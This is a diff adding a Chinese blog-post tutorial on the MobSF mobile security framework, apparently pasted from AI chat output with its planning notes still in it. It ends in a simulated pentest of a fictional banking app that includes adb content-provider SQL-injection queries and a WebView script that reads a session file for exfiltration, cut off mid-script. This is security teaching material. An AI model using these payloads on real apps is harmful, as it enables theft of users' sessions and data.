@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.com/binghey/blog/blob/main/%E6%89%A7%E8%A1%8C%E5%90%88%E4%B8%80%E7%AC%94%E8%AE%B0.png?raw=true"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="MobSF（Mobile Security Framework）这一移动端安全测试框架。">
+<meta property="og:title" content="MobSF工具详细介绍与使用指南">
+<meta property="og:description" content="MobSF（Mobile Security Framework）这一移动端安全测试框架。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://binghey.github.io/blog/post/MobSF-gong-ju-xiang-xi-jie-shao-yu-shi-yong-zhi-nan.html">
+<meta property="og:image" content="https://github.com/binghey/blog/blob/main/%E6%89%A7%E8%A1%8C%E5%90%88%E4%B8%80%E7%AC%94%E8%AE%B0.png?raw=true">
+<title>MobSF工具详细介绍与使用指南</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">MobSF工具详细介绍与使用指南</h1>
+<div class="title-right">
+    <a href="https://binghey.github.io/blog" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/binghey/blog/issues/12" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p>MobSF（Mobile Security Framework）这一移动端安全测试框架。由于用户要求用中文回复，我们将用中文进行详细介绍。</p>
+<p>注意：由于我们无法执行代码或访问外部网络，因此无法提供实时数据或截图，但我们将尽可能详细地描述。</p>
+<p>我们将按照以下结构进行介绍：</p>
+<p>MobSF简介</p>
+<p>主要功能</p>
+<p>安装与部署</p>
+<p>使用方法</p>
+<p>使用场景</p>
+<p>注意事项</p>
+<p>MobSF 是一个自动化、一体化的移动应用程序（Android、iOS、Windows）<strong>渗透测试、恶意软件分析和安全评估框架</strong>。它能够执行静态和动态分析，是应用安全测试人员、开发者和研究人员手中非常强大的工具。</p>
+<hr>
+<h3>1. MobSF 是什么？</h3>
+<p>MobSF 是一个开源项目，其核心目标是简化移动应用的安全评估流程。它将多种安全测试技术集成到一个统一的Web界面中，用户只需上传应用安装包（APK、IPA、APPX等），它就能自动执行一系列测试，并生成一份详细的安全报告。</p>
+<p><strong>官方仓库：</strong> <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></p>
+<hr>
+<h3>2. 核心功能与特性</h3>
+<p>MobSF 的功能非常全面，主要可以分为以下几个方面：</p>
+<h4><strong>2.1 静态分析</strong></h4>
+<p>在不运行应用程序的情况下，分析其源代码和资源文件。</p>
+<ul>
+<li><strong>Android (APK):</strong>
+<ul>
+<li><strong>清单文件分析：</strong> 检查 <code class="notranslate">AndroidManifest.xml</code> 中的不安全配置，如调试标志、备份允许、不安全的权限等。</li>
+<li><strong>代码分析：</strong> 分析反编译的 Smali 或 Java 代码，查找硬编码的敏感信息（API密钥、密码）、不安全的随机数生成、WebView漏洞、SQL注入风险等。</li>
+<li><strong>权限检查：</strong> 列出所有申请的和危险的权限，并评估其合理性。</li>
+<li><strong>组件安全：</strong> 检查 Activity、Service、Broadcast Receiver 和 Content Provider 的暴露和配置安全问题。</li>
+<li><strong>第三方库识别：</strong> 识别应用中使用的第三方库及其已知漏洞。</li>
+</ul>
+</li>
+<li><strong>iOS (IPA):</strong>
+<ul>
+<li><strong>Info.plist 分析：</strong> 检查不安全的传输安全设置、设备能力配置等。</li>
+<li><strong>二进制分析：</strong> 检查二进制文件的安全特性，如PIE（位置无关代码）、ARC（自动引用计数）、栈保护等。</li>
+<li><strong>API 调用分析：</strong> 识别不安全的 API 使用。</li>
+</ul>
+</li>
+<li><strong>通用功能：</strong>
+<ul>
+<li><strong>证书与签名分析：</strong> 验证应用的签名和证书信息。</li>
+<li><strong>文件结构浏览：</strong> 允许用户手动浏览解压后的应用文件结构。</li>
+</ul>
+</li>
+</ul>
+<h4><strong>2.2 动态分析</strong></h4>
+<p>在模拟器或真机上运行应用程序，并监控其运行时行为。</p>
+<ul>
+<li><strong>仅支持 Android：</strong> MobSF 的动态分析功能主要针对 Android。</li>
+<li><strong>实时日志捕获：</strong> 捕获应用运行时的 <code class="notranslate">Logcat</code> 日志。</li>
+<li><strong>网络流量分析：</strong> 通过内置的代理截获和分析应用的 HTTP/HTTPS 流量。</li>
+<li><strong>API 调用监控：</strong> 跟踪应用对敏感 API（如获取位置、读取联系人）的调用。</li>
+<li><strong>文件系统监控：</strong> 监控应用在运行期间创建和访问的文件。</li>
+<li><strong>活动遍历：</strong> 尝试自动遍历应用的所有活动界面，以发现潜在的安全问题。</li>
+</ul>
+<h4><strong>2.3 移动恶意软件分析</strong></h4>
+<p>通过与 <strong>VirusTotal</strong> 等在线扫描引擎的集成，可以对应用进行恶意软件检测。</p>
+<h4><strong>2.4 Web API 测试</strong></h4>
+<p>MobSF 还集成了对移动应用后端 API 的模糊测试和静态分析功能（通过 <code class="notranslate">api.json</code> 文件）。</p>
+<h4><strong>2.5 可扩展性</strong></h4>
+<p>MobSF 提供了 REST API，可以轻松地集成到 CI/CD 流水线中，实现自动化的安全测试。</p>
+<hr>
+<h3>3. 安装与部署</h3>
+<p>MobSF 的安装方式非常灵活，主要有以下几种：</p>
+<ol>
+<li>
+<p><strong>使用 Docker（推荐，最简单）</strong><br>
+这是最快、最干净的安装方式，可以避免环境依赖冲突。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 拉取最新镜像</span>
+docker pull opensecurity/mobile-security-framework-mobsf
+<span class="pl-c"><span class="pl-c">#</span> 运行容器</span>
+docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</pre></div>
+<p>运行后，在浏览器中访问 <code class="notranslate">http://localhost:8000</code> 即可。</p>
+</li>
+<li>
+<p><strong>本地安装</strong><br>
+可以按照官方文档的说明，在本地通过 <code class="notranslate">git clone</code> 和运行安装脚本的方式来部署。这需要系统已安装 Python、Node.js 等依赖。</p>
+</li>
+<li>
+<p><strong>云实例</strong><br>
+也可以部署在云服务器上，供团队其他成员访问使用。</p>
+</li>
+</ol>
+<hr>
+<h3>4. 基本使用流程</h3>
+<p>使用 MobSF 进行安全测试的流程非常直观：</p>
+<ol>
+<li><strong>启动 MobSF：</strong> 通过 Docker 或本地命令启动服务。</li>
+<li><strong>访问 Web 界面：</strong> 在浏览器中打开 MobSF 的地址（通常是 <code class="notranslate">http://localhost:8000</code>）。</li>
+<li><strong>上传应用文件：</strong>
+<ul>
+<li>点击 “Upload” 按钮。</li>
+<li>选择要分析的 APK（Android）或 IPA（iOS）文件。</li>
+</ul>
+</li>
+<li><strong>执行扫描：</strong> 上传后，MobSF 会自动开始静态分析。对于 Android 应用，你还可以在分析完成后点击 “Start Dynamic Analysis” 来启动动态分析（需要提前配置好模拟器或真机）。</li>
+<li><strong>查看报告：</strong> 分析完成后，会生成一份详细的 HTML/PDF 报告。报告会列出发现的安全问题、风险等级、详细描述、受影响的文件以及修复建议。</li>
+</ol>
+<hr>
+<h3>5. 应用场景与目标用户</h3>
+<ul>
+<li><strong>移动应用安全工程师/渗透测试人员：</strong> 作为核心工具，用于对移动应用进行全面的安全评估。</li>
+<li><strong>移动应用开发者：</strong> 在开发过程中进行自检，及早发现并修复安全问题。</li>
+<li><strong>安全研究人员：</strong> 用于快速分析应用的安全状况或进行批量应用扫描。</li>
+<li><strong>质量保证团队：</strong> 将 MobSF 集成到 CI/CD 流程中，作为质量门禁的一部分。</li>
+</ul>
+<hr>
+<h3>6. 优势与局限性</h3>
+<h4><strong>优势：</strong></h4>
+<ul>
+<li><strong>功能全面：</strong> 集静态、动态、恶意软件分析于一身。</li>
+<li><strong>开源免费：</strong> 无需付费，功能强大。</li>
+<li><strong>用户友好：</strong> 基于 Web 的图形界面，操作简单，报告直观。</li>
+<li><strong>高度可扩展：</strong> 支持 API 和 CI/CD 集成。</li>
+<li><strong>社区活跃：</strong> 拥有一个活跃的社区，持续更新和维护。</li>
+</ul>
+<h4><strong>局限性：</strong></h4>
+<ul>
+<li><strong>误报/漏报：</strong> 像所有自动化工具一样，可能存在误报和漏报，需要测试人员手动验证。</li>
+<li><strong>动态分析对 Android 支持更好：</strong> 对 iOS 的动态分析功能有限。</li>
+<li><strong>无法替代人工测试：</strong> MobSF 是一个优秀的辅助工具，但不能完全替代深入的手动安全测试和代码审计。</li>
+<li><strong>环境配置：</strong> 动态分析需要配置 Android 模拟器或真机环境，有时可能会遇到兼容性问题。</li>
+</ul>
+<hr>
+<h3>总结</h3>
+<p>MobSF 是目前最流行、功能最强大的开源移动应用安全测试框架之一。它极大地提高了安全测试的效率，将复杂的分析过程自动化，并为安全人员提供了清晰的切入点。无论你是专业的安全研究员还是希望提升应用安全性的开发者，学习和使用 MobSF 都是一个非常有价值的选择。</p>
+<p><strong>重要提示：</strong> 请仅在您拥有合法权限的应用程序上使用 MobSF。未经授权对他人的应用进行安全测试可能是非法的。</p>
+<p>Linux环境下使用Docker方式安装MobSF，因为这是最简单的方式。<br>
+注意：确保已经安装了Docker。</p>
+<p>步骤：</p>
+<p>拉取MobSF镜像</p>
+<p>运行MobSF容器</p>
+<p>访问MobSF的Web界面</p>
+<p>上传应用进行静态和动态分析</p>
+<p>由于动态分析需要连接模拟器或真机，我们这里先介绍静态分析，动态分析需要额外配置。</p>
+<p>我们使用Docker运行MobSF，默认只进行静态分析。如果需要动态分析，需要将设备连接到容器，或者使用容器内的模拟器（这比较复杂，通常建议使用外部的模拟器或真机并通过网络连接）。</p>
+<p>这里我们先进行静态分析教程。</p>
+<p>假设你已经安装了Docker。</p>
+<p>好的，这里为您提供一份详细的 <strong>MobSF 使用教程</strong>，从安装到执行完整的静态和动态分析。</p>
+<hr>
+<h3>第一步：安装 MobSF（Docker 方式 - 最推荐）</h3>
+<p>这是最简单、最不容易出错的方法，可以避免复杂的Python环境配置。</p>
+<ol>
+<li>
+<p><strong>确保系统已安装 Docker</strong></p>
+<ul>
+<li>访问 <a href="https://docs.docker.com/get-docker/" rel="nofollow">Docker 官网</a> 下载并安装适合你操作系统的 Docker Desktop。</li>
+</ul>
+</li>
+<li>
+<p><strong>拉取 MobSF 镜像</strong><br>
+打开终端（命令行），执行以下命令：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">docker pull opensecurity/mobile-security-framework-mobsf:latest</pre></div>
+</li>
+<li>
+<p><strong>运行 MobSF 容器</strong><br>
+执行以下命令，将本地的8000端口映射到容器的8000端口：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</pre></div>
+<ul>
+<li><code class="notranslate">-it</code>：以交互模式运行。</li>
+<li><code class="notranslate">--rm</code>：容器停止后自动删除（可选，用于清理）。</li>
+<li><code class="notranslate">-p 8000:8000</code>：端口映射。</li>
+</ul>
+</li>
+<li>
+<p><strong>访问 MobSF</strong><br>
+当终端出现 <code class="notranslate">MobSF is running on http://0.0.0.0:8000</code> 的提示时，说明启动成功。打开你的浏览器，访问：</p>
+<pre class="notranslate"><code class="notranslate">http://localhost:8000
+</code></pre>
+<p>你将看到 MobSF 的 Web 界面。</p>
+</li>
+</ol>
+<hr>
+<h3>第二步：静态分析 - 以 Android APK 为例</h3>
+<p>这是 MobSF 最核心、最常用的功能。</p>
+<ol>
+<li>
+<p><strong>准备测试应用</strong><br>
+准备一个用于测试的 APK 文件。你可以从以下途径获取：</p>
+<ul>
+<li>自己编写一个简单的 Demo App。</li>
+<li>从 <a href="https://github.com/OWASP/MSTG-Hacking-Playground">OWASP MSTG Hacking Playground</a> 等安全学习仓库下载。</li>
+</ul>
+</li>
+<li>
+<p><strong>上传并扫描</strong></p>
+<ul>
+<li>在 MobSF 主界面，点击 <strong>"Upload"</strong> 按钮。</li>
+<li>在弹出的文件选择器中，找到你的 APK 文件并选择它。</li>
+<li>上传完成后，MobSF 会自动开始静态分析。</li>
+</ul>
+</li>
+<li>
+<p><strong>解读分析报告</strong><br>
+分析完成后，会自动跳转到报告页面。报告分为几个主要部分，你需要重点关注以下内容：</p>
+<ul>
+<li><strong>应用基本信息</strong>
+<ul>
+<li><strong>包名、版本号、签名证书</strong>：了解应用的基本身份信息。</li>
+</ul>
+</li>
+<li><strong>安全评分</strong>
+<ul>
+<li>一个总体的安全分数，可以快速了解应用的安全状况。</li>
+</ul>
+</li>
+<li><strong>清单分析</strong>
+<ul>
+<li><strong><code class="notranslate">android:allowBackup="true"</code></strong>： 允许备份可能导致数据泄露。</li>
+<li><strong><code class="notranslate">android:debuggable="true"</code></strong>： 生产环境应用不应可调试。</li>
+<li><strong>导出组件</strong>： 检查 Activity、Service、Content Provider 等组件是否被不必要的导出，这可能成为攻击入口。</li>
+</ul>
+</li>
+<li><strong>权限分析</strong>
+<ul>
+<li><strong>所有权限列表</strong>： 查看应用申请了哪些权限。</li>
+<li><strong>危险权限</strong>： 高亮显示那些涉及用户隐私和设备控制的危险权限。思考这些权限是否必要。</li>
+</ul>
+</li>
+<li><strong>代码分析</strong>
+<ul>
+<li><strong>硬编码敏感信息</strong>： MobSF 会尝试查找代码中的字符串常量，如 API Keys、密码、URL等。</li>
+<li><strong>不安全的通信</strong>： 发现使用不安全的协议（如 HTTP）、证书验证被禁用等。</li>
+<li><strong>WebView 漏洞</strong>： 如 <code class="notranslate">setJavaScriptEnabled(true)</code> 与 <code class="notranslate">setAllowFileAccess(true)</code> 的组合可能导致 RCE。</li>
+<li><strong>密码学误用</strong>： 使用不安全的加密算法（如 MD5, SHA1）或不安全的随机数生成器。</li>
+</ul>
+</li>
+<li><strong>文件列表</strong>
+<ul>
+<li>你可以在这里浏览应用解压后的所有文件，并直接查看源代码（如 <code class="notranslate">classes.dex</code> 反编译后的 Smali/Java 代码）、资源文件等。</li>
+</ul>
+</li>
+<li><strong>恶意软件分析</strong>
+<ul>
+<li>如果配置了 VirusTotal API 密钥，这里会显示多家引擎的扫描结果。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3>第三步：动态分析 - 仅限 Android</h3>
+<p>动态分析需要在运行中的应用上进行。MobSF 支持连接 <strong>Android 模拟器</strong> 或 <strong>物理手机</strong>。</p>
+<h4>前提条件：配置 Android 设备</h4>
+<p><strong>A. 使用 Android 模拟器（推荐用于测试）</strong></p>
+<ol>
+<li>下载并安装 <a href="https://developer.android.com/studio" rel="nofollow">Android Studio</a>。</li>
+<li>打开 AVD Manager，创建一个新的虚拟设备（建议使用 Android 8.0 或更高版本，且使用 <strong>Google APIs</strong> 或 <strong>Google Play</strong> 镜像，而非纯 AOSP）。</li>
+<li>启动该模拟器。</li>
+</ol>
+<p><strong>B. 使用物理手机</strong></p>
+<ol>
+<li>开启手机的 <strong>"开发者选项"</strong>（通常通过多次点击"设置"-&gt;"关于手机"-&gt;"版本号"）。</li>
+<li>在开发者选项中，开启 <strong>"USB 调试"</strong>。</li>
+</ol>
+<h4>在 MobSF 中执行动态分析</h4>
+<ol>
+<li>
+<p><strong>确保设备连接</strong></p>
+<ul>
+<li>对于模拟器，MobSF 通常能自动发现。</li>
+<li>对于物理手机，通过 USB 连接电脑，并确保电脑已安装相应的 USB 驱动程序。在终端输入 <code class="notranslate">adb devices</code>，确认设备已列出。</li>
+</ul>
+</li>
+<li>
+<p><strong>启动动态分析</strong></p>
+<ul>
+<li>在完成对一个 APK 的<strong>静态分析</strong>后，报告页面上会有一个蓝色的 <strong>"Start Dynamic Analysis"</strong> 按钮。</li>
+<li>点击该按钮。MobSF 会自动：
+<ul>
+<li>将 APK 安装到连接的设备上。</li>
+<li>启动一个代理服务器用于拦截流量。</li>
+<li>在设备上设置全局代理，指向 MobSF 的代理。</li>
+<li>启动应用。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>操作应用与查看结果</strong></p>
+<ul>
+<li>动态分析界面会分为几个面板。你需要<strong>手动操作</strong>正在运行的应用，尽可能多地触发功能，以便 MobSF 捕获数据。</li>
+<li><strong>日志</strong>：实时显示应用日志。</li>
+<li><strong>API 监控</strong>：显示应用调用了哪些敏感 API。</li>
+<li><strong>网络流量</strong>：显示所有拦截到的 HTTP/HTTPS 请求和响应。</li>
+<li><strong>文件操作</strong>：显示应用创建或访问的文件。</li>
+<li><strong>漏洞列表</strong>：动态分析过程中发现的漏洞会在这里显示，例如：
+<ul>
+<li>通过不安全的连接（HTTP）传输数据。</li>
+<li>在日志中打印敏感信息。</li>
+<li>截取应用屏幕。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>停止与分析</strong></p>
+<ul>
+<li>当你完成应用遍历后，点击 <strong>"Stop Analysis"</strong> 来停止动态分析并生成最终报告。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3>第四步：生成和导出报告</h3>
+<p>在静态或动态分析报告的页面顶部，你可以找到导出选项：</p>
+<ul>
+<li><strong>PDF 报告</strong>： 生成一份格式良好的 PDF 报告，适合交付。</li>
+<li><strong>JSON 报告</strong>： 机器可读的格式，便于集成到其他系统或进行自定义分析。</li>
+</ul>
+<hr>
+<h3>使用技巧与注意事项</h3>
+<ol>
+<li><strong>手动验证</strong>： MobSF 的报告（尤其是代码分析部分）可能存在误报。<strong>永远不要 100% 相信自动化工具的结果</strong>，一定要手动查看代码和配置进行确认。</li>
+<li><strong>深入代码</strong>： 利用 MobSF 提供的文件浏览器，直接查看反编译的代码，这是理解和验证漏洞的关键。</li>
+<li><strong>配置 VirusTotal</strong>： 为了使用恶意软件分析功能，你需要在 <code class="notranslate">settings.py</code> 中配置你的 VirusTotal API 密钥（对于 Docker 方式，需要创建自定义的配置文件并挂载到容器中）。</li>
+<li><strong>CI/CD 集成</strong>： 使用 MobSF 的 REST API，你可以在持续集成流程中自动进行安全扫描。具体 API 用法请参考官方文档。</li>
+</ol>
+<h3>总结：基本工作流</h3>
+<ol>
+<li><strong><code class="notranslate">docker run ...</code></strong> -&gt; 启动 MobSF。</li>
+<li><strong><code class="notranslate">http://localhost:8000</code></strong> -&gt; 打开界面。</li>
+<li><strong>Upload APK</strong> -&gt; 上传应用。</li>
+<li><strong>阅读静态分析报告</strong> -&gt; 发现代码和配置问题。</li>
+<li><strong>（可选）Start Dynamic Analysis</strong> -&gt; 连接设备，操作应用，捕获运行时行为。</li>
+<li><strong>导出 PDF/JSON 报告</strong> -&gt; 归档或交付。</li>
+</ol>
+<p>这个教程涵盖了 MobSF 的核心使用流程。要成为高手，关键在于不断实践，并结合移动应用安全知识去深入理解报告中的每一个发现。</p>
+<p>渗透测试场景，其中我们使用MobSF来分析一个Android应用（APK）。假设我们是一个安全研究员，受邀对一个应用进行安全评估。我们将使用MobSF来辅助我们进行静态和动态分析，以发现潜在的安全漏洞。</p>
+<p>场景：对一款名为“VulnApp”的Android应用进行安全测试。</p>
+<p>步骤：</p>
+<p>收集信息：我们首先获取了VulnApp的APK文件，版本为1.0。</p>
+<p>使用MobSF进行静态分析。</p>
+<p>使用MobSF进行动态分析。</p>
+<p>结合静态和动态分析结果，手动验证漏洞。</p>
+<p>生成报告。</p>
+<p>下面我们模拟这个过程中MobSF的使用和发现。</p>
+<p>静态分析发现：</p>
+<p>在AndroidManifest.xml中，发现一个Content Provider被导出（exported=true），且没有设置适当的权限保护。</p>
+<p>在代码中发现了硬编码的API密钥。</p>
+<p>应用使用HTTP协议进行通信，没有使用TLS。</p>
+<p>WebView配置中，启用了JavaScript和文件访问，且允许访问本地文件，这可能导致本地文件泄露。</p>
+<p>动态分析发现：</p>
+<p>通过动态分析，我们截获了登录请求，发现密码以明文形式通过HTTP传输。</p>
+<p>在应用运行时，我们发现它将敏感信息（如会话令牌）写入日志，这可以通过Logcat读取。</p>
+<p>现在，我们将模拟MobSF在渗透测试中的使用，并给出一个详细的案例。</p>
+<p>注意：以下内容为模拟案例，实际测试中需获得授权。</p>
+<p>好的，这里为您呈现一个使用 MobSF 进行移动应用渗透测试的 <strong>完整实战场景案例</strong>。</p>
+<p>我们将模拟一个针对 "VulnBank"（一个虚构的银行应用）的渗透测试过程，展示 MobSF 如何在实际安全评估中发挥作用。</p>
+<hr>
+<h3>场景概述</h3>
+<ul>
+<li><strong>测试目标</strong>：<code class="notranslate">VulnBank Android App v1.0 (com.vulnbank.app)</code></li>
+<li><strong>测试类型</strong>：黑盒渗透测试（假设我们对应用内部代码一无所知）</li>
+<li><strong>测试工具</strong>：MobSF（作为核心分析工具），辅以 Burp Suite 进行手动流量验证。</li>
+<li><strong>最终目标</strong>：发现并利用安全漏洞，获取其他用户的敏感信息。</li>
+</ul>
+<hr>
+<h3>渗透测试流程</h3>
+<h4>阶段一：信息收集与静态分析</h4>
+<ol>
+<li>
+<p><strong>获取应用</strong></p>
+<ul>
+<li>从客户的官方网站或应用商店下载 <code class="notranslate">VulnBank_v1.0.apk</code>。</li>
+</ul>
+</li>
+<li>
+<p><strong>MobSF 静态扫描</strong></p>
+<ul>
+<li>启动 MobSF，上传 APK 文件。</li>
+<li>等待自动静态分析完成。</li>
+</ul>
+</li>
+<li>
+<p><strong>关键发现与初步分析</strong></p>
+<ul>
+<li>
+<p><strong>清单文件分析</strong>：</p>
+<ul>
+<li><code class="notranslate">android:allowBackup="true"</code> - 允许应用数据备份。</li>
+<li><code class="notranslate">android:debuggable="true"</code> - 生产环境应用竟可调试！<strong>（高危信号）</strong></li>
+<li>发现一个导出的 <code class="notranslate">ContentProvider</code>：<code class="notranslate">com.vulnbank.provider.UserDataProvider</code>。</li>
+</ul>
+</li>
+<li>
+<p><strong>权限分析</strong>：</p>
+<ul>
+<li>应用申请了 <code class="notranslate">INTERNET</code>, <code class="notranslate">READ_EXTERNAL_STORAGE</code>, <code class="notranslate">ACCESS_FINE_LOCATION</code> 等权限。权限列表看起来基本合理。</li>
+</ul>
+</li>
+<li>
+<p><strong>代码分析（MobSF 自动标记）</strong>：</p>
+<ul>
+<li><strong>硬编码的凭据</strong>：在 <code class="notranslate">strings.xml</code> 中发现一个名为 <code class="notranslate">api_server_key</code> 的字符串，看起来像是一个静态的 API 密钥。</li>
+<li><strong>证书验证禁用</strong>：发现代码中有关闭 SSL 证书验证的代码（<code class="notranslate">TrustAllCerts</code> 相关代码）。<strong>（高危）</strong></li>
+<li><strong>不安全的 WebView 配置</strong>：<code class="notranslate">WebView.setJavaScriptEnabled(true)</code> 且 <code class="notranslate">WebView.setAllowFileAccess(true)</code>。<strong>（中高危）</strong></li>
+<li><strong>SQL 注入可能性</strong>：在 <code class="notranslate">UserDataProvider</code> 的查询方法中，发现使用原始 SQL 查询拼接用户输入。</li>
+</ul>
+</li>
+<li>
+<p><strong>文件浏览</strong>：</p>
+<ul>
+<li>手动检查 <code class="notranslate">AndroidManifest.xml</code>，确认 <code class="notranslate">UserDataProvider</code> 的导出属性：<code class="notranslate">android:exported="true"</code>。这意味着任何应用都可以访问这个 Content Provider。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h4>阶段二：动态分析与漏洞利用</h4>
+<p>基于静态分析的发现，我们开始有针对性的动态测试。</p>
+<ol>
+<li>
+<p><strong>配置动态分析环境</strong></p>
+<ul>
+<li>在 MobSF 中启动动态分析，MobSF 会自动在已连接的模拟器上安装应用并设置代理。</li>
+</ul>
+</li>
+<li>
+<p><strong>漏洞利用路径一：不安全的 Content Provider</strong></p>
+<ul>
+<li><strong>背景</strong>：静态分析发现 <code class="notranslate">UserDataProvider</code> 可导出且可能存在 SQL 注入。</li>
+<li><strong>利用</strong>：
+<ul>
+<li>我们不直接使用 MobSF，而是编写一个简单的攻击应用，或者使用 <code class="notranslate">adb shell</code> 进行查询。</li>
+<li>通过 <code class="notranslate">content</code> 命令查询该 Provider：</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">adb shell content query --uri content://com.vulnbank.provider.UserDataProvider/users</pre></div>
+<ul>
+<li><strong>结果</strong>：成功返回了数据库中所有用户的明文信息，包括用户名、邮箱、甚至哈希后的密码！这证实了 <strong>数据泄露漏洞</strong>。</li>
+<li><strong>进一步利用（SQL 注入）</strong>：尝试注入参数：</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">adb shell content query --uri <span class="pl-s"><span class="pl-pds">"</span>content://com.vulnbank.provider.UserDataProvider/users --where '1=1'<span class="pl-pds">"</span></span></pre></div>
+<ul>
+<li><strong>结果</strong>：同样返回了所有数据，证实了 <strong>SQL 注入漏洞</strong>。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>漏洞利用路径二：不安全的网络通信</strong></p>
+<ul>
+<li><strong>背景</strong>：静态分析发现证书验证被禁用。</li>
+<li><strong>利用</strong>：
+<ul>
+<li>在 MobSF 的动态分析界面操作 VulnBank 应用，进行登录、查看账户等操作。</li>
+<li>观察 MobSF 的 <strong>"Network Logs"</strong> 面板。可以看到所有登录和交易请求都发送到了 <code class="notranslate">http://api.vulnbank.com</code>（使用 HTTP，而不是 HTTPS）。<strong>（高危）</strong></li>
+<li><strong>中间人攻击</strong>：由于应用还禁用了证书验证，攻击者可以轻易地进行中间人攻击，解密和篡改所有的 HTTPS 流量（如果存在的话）。我们使用 Burp Suite 可以轻松截获并修改请求，例如在转账时修改收款人和金额。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>漏洞利用路径三：WebView 漏洞利用</strong></p>
+<ul>
+<li><strong>背景</strong>：静态分析发现不安全的 WebView 配置。</li>
+<li><strong>利用</strong>：
+<ul>
+<li>在应用中找到一个使用 WebView 加载内容的界面（例如"用户协议"或"帮助"页面）。</li>
+<li>由于 <code class="notranslate">setAllowFileAccess(true)</code>，我们可以尝试通过 WebView 读取设备的本地文件。我们通过 ADB 将一个包含恶意 JavaScript 的 HTML 文件推到设备上。</li>
+<li>恶意 HTML 内容：</li>
+</ul>
+<div class="highlight highlight-text-html-basic"><pre class="notranslate"><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
+<span class="pl-k">function</span> <span class="pl-en">readFile</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
+  <span class="pl-c">// 尝试通过 file:// 协议读取敏感文件</span>
+  <span class="pl-k">var</span> <span class="pl-s1">xhr</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">XMLHttpRequest</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+  <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">open</span><span class="pl-kos">(</span><span class="pl-s">'GET'</span><span class="pl-kos">,</span> <span class="pl-s">'file:///data/data/com.vulnbank.app/shared_prefs/user_session.xml'</span><span class="pl-kos">,</span> <span class="pl-c1">false</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+  <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">send</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+  <span class="pl-c">// 将读取到的内容发送到攻击者控制的服务器</span>
+  <span class="pl-k">var</span> <span class="pl-s1">img</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">Image</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
